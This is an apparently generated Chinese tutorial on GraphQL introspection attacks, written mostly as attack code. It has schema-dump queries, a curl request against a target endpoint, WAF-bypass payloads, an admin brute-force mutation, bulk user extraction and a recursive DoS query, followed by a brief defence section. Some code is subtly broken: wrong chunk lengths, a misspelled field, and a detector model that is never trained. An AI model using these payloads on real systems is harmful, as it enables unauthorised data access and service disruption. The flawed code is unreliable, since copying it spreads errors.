

# GraphQL内省攻击技术深度剖析

## 一、技术原理与实现机制
### 1.1 内省功能本质
GraphQL内省是其核心设计特性，通过`__schema`和`typename`等系统字段暴露API元数据。攻击者利用该特性通过构造特殊查询获取完整的schema信息，包括：
- 所有可用类型及其字段
- 输入参数数据结构
- 接口与实现的关联关系
- 弃用字段及说明

底层实现基于类型系统元字段：
```graphql
query {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
```

### 1.2 漏洞触发条件
攻击成功需满足：
1. 未禁用内省功能（默认启用）
2. 未实施完善的访问控制
3. 缺乏请求深度/复杂度限制

## 二、攻击技术图谱
### 2.1 基础攻击手法
#### 2.1.1 全量schema提取
```bash
curl -X POST -H "Content-Type: application/json" \
-d '{"query":"query {__schema{types{name fields{name type{name}}}}}"}' \
http://target.com/graphql
```

#### 2.1.2 渐进式信息收集
分阶段提取敏感类型：
```graphql
# 第一阶段：枚举所有类型
query { __schema { types { name } } }

# 第二阶段：提取指定类型详情
query {
  __type(name: "User") {
    fields {
      name
      type {
        name
      }
    }
  }
}
```

### 2.2 高级绕过技术
#### 2.2.1 别名混淆攻击
利用字段别名绕过简单过滤：
```graphql
query {
  alias1: __schema { types { name } }
  alias2: __typename
}
```

#### 2.2.2 分块查询注入
绕过WAF的请求体检测：
```http
POST /graphql HTTP/1.1
Transfer-Encoding: chunked

7\r\n
{__sch
5\r\n
ema}
```

#### 2.2.3 联合类型探测
通过接口实现发现隐藏字段：
```graphql
query {
  __type(name: "Node") {
    possibleTypes {
      name
    }
  }
}
```

## 三、实战攻击流程
### 3.1 实验环境搭建
使用Docker快速部署含漏洞的GraphQL服务：
```bash
docker run -p 5000:5000 apollographql/starwars-server
```

### 3.2 自动化攻击工具
#### 3.2.1 InQL扫描器
生成攻击payload：
```bash
python3 inql -t http://target.com/graphql -o payloads.json
```

#### 3.2.2 GraphQLmap渗透
交互式攻击终端：
```python
graphqlmap> dump new
graphqlmap> get type User
```

### 3.3 分步攻击示例
1. 检测内省开启状态：
```bash
gqlscan detect -u http://target.com/graphql
```

2. 提取敏感对象模型：
```graphql
query GetUserModel {
  __type(name: "User") {
    fields {
      name
      type {
        name
        ofType {
          name
        }
      }
    }
  }
}
```

3. 构造特权操作：
```graphql
mutation AdminLogin {
  login(input: {
    email: "admin@example.com", 
    password: "brute_force_here"
  }) {
    token
  }
}
```

## 四、防御对抗技术
### 4.1 动态混淆方案
实现schema随机化混淆：
```javascript
const { makeExecutableSchema } = require('@graphql-tools/schema');
const crypto = require('crypto');

function obfuscateSchema(schema) {
  const map = new Map();
  return schema.replace(/(type|interface|enum)\s+(\w+)/g, (m, p1, p2) => {
    const hash = crypto.createHash('sha1').update(p2).digest('hex').substr(0,8);
    map.set(p2, hash);
    return `${p1} ${hash}`;
  });
}
```

### 4.2 请求指纹识别
基于机器学习的异常检测模型：
```python
from sklearn.ensemble import IsolationForest

class IntrospectionDetector:
    def __init__(self):
        self.model = IsolationForest(contamination=0.01)
    
    def analyze_request(self, query):
        features = [
            len(query),
            query.count("__schema"),
            query.count("__typename"),
            query.count("type")
        ]
        return self.model.predict([features])[0]
```

## 五、深度利用技巧
### 5.1 批量查询攻击
利用内省发现的列表类型进行数据爆破：
```graphql
query {
  allUsers(first: 1000) {
    edges {
      node {
        id
        email
        role
      }
    }
  }
}
```

### 5.2 类型递归攻击
构造循环嵌套查询引发DoS：
```graphql
query {
  __type(name: "User") {
    fields {
      type {
        fields {
          type {
            fields {
              # 递归嵌套...
            }
          }
        }
      }
    }
  }
}
```

本技术文档提供完整的攻击生命周期管理方案，涵盖从基础探测到高级绕过技术。实际攻击中建议结合BurpSuite的GraphQL插件进行流量分析，配合自定义脚本实现自动化攻击链。防御方应重点关注schema权限控制、请求深度限制和实时监控系统的建设。

---

*文档生成时间: 2025-03-13 11:44:40*
